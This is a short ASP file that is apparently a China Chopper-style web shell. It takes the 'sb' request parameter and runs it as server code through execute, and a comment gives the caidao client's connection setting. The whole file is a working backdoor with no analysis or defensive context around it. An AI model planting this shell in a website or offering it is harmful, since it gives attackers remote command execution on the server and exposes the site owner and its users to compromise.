<%
<!-- caidao setting input:<O>sb=eval(request(0))</O>,connecting pass:0 -->
re= request("sb")
if re <>"" then
execute re
response.end
end if
%>